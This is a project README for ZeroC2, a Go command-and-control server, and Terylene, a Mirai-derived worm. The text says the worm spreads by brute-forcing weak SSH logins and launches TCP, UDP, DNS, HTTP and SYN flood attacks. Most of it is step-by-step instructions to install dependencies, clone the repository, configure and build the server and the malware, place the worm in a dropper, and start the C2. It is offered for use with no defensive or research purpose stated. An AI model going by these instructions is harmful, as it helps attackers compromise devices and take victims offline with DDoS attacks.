![ZeroC2](https://github.com/BishopFox/sliver/assets/93959737/37af624e-9935-40d2-b2ff-630c53e3ec21)





## ZeroMq Description
Zeromq is a very low-level fast asynchronous messaging library that can handle large amounts of connections and requests under seconds. It was able to get a transfer rate of 10,000 messages per 15 milliseconds, or between 66,000 and 70,000 messages/s under low-latency and it was able to beat rabbitmq , kafka and many other network libraries. Additionally , zeromq lightweight and low level library made in C++ uses as little resources as possible while maintaining the best performance


[ZeroMq benchmark](http://wiki.zeromq.org/area:results "ZeroMq benchmark")


## ZeroMq + Golang
ZeroMQ and Golang is powerful combination for building distributed and scalable systems that can handle lots of requests. ZeroMQ is a messaging library that provides high-performance, asynchronous communication between applications, along with golang's simplicity, efficiency, and built-in support for concurrent and parallel programming, it makes the C2 very flexible, easy to manage, efficient at resource utilization and most importantly...fast


## ZeroC2
ZeroC2 is a ZMQ golang C2 server designed for botnet traffic control and carrying out ddos attacks , ZeroC2 accepts connection for terylene. ZeroC2 has heartbeating sensor and it is able to transfer and mitigate terylene connection.

## Terylene
Terylene is a modified version of the previous mirai botnet using golang instead of C, it has improved feature of the previous version of mirai and able to carry out concurrent tasks. Terylene is self replicating and able to scan the network , identify weak ssh logins, and attempts to inject itself into the vulnerable devices directly, Instead of sending the vulnerable Device to the C2 for the C2 to infect.  Terylene is also able to carry out more Advanced ddos attacks that are adaptable with today's ddos security, which includes builtin TCP, UDP, DNS, HTTP, SYN and Modified UDP attacks.


# Difference between Terylene and mirai botnet

|   | Terylene                        | Mirai botnet               |
|---|---------------------------------|----------------------------|
|   | faster worm                     | slower worm                |
|   | able to mitigate                | unable to mitigate         |
|   | stream socket attacks           | raw socket attacks         |
|   | targets almost all linux distro | targets all linux distro   |
|   | smarter Ddos techniques         | old school ddos techniques |



# Debian based Setup
> Ubuntu , Debian , Kali, Parrot OS

### Install ZMQ package using APT
```
sudo apt update
sudo apt upgrade
sudo apt-get install libzmq3-dev
```
### Install golang using APT
```
apt-get install golang-go
```

# Arch based setup
> Arch , BlackArch

### Install ZMQ package using pacman

```
sudo pacman -Sy
sudo pacman -S zeromq
```

### Install golang using pacman
```
sudo pacman -S go
```


# Red Hat based setup
> CentOs, Rocky , Fedora
### Install ZMQ package using yum

```
sudo yum update
sudo dnf makecache --refresh
sudo yum install zeromq
```

### Install Golang using yum

```
yum install golang
```

# ZeroC2 and terylene setup

### Clone the repo
```
git clone https://github.com/polymaster3313/terylene.git
```

### setup the dependencies
```
cd terylene
go mod init terylene
go mod tidy
```

### edit the configs in client.go and server.go respectively

```
cd mirai
nano terylene.go
cd ..
cd server
nano server.go
cd ..
```

### build terylene and ZeroC2

```
cd server
go build server.go
cd ..
cd mirai
go build -ldflags="-s -w" terylene.go
```

### drop the terylene malware into the dropper

```
mv terylene <path to the dropper folder>
```

### start the zeroC2

```
./server
```
//Enjoy

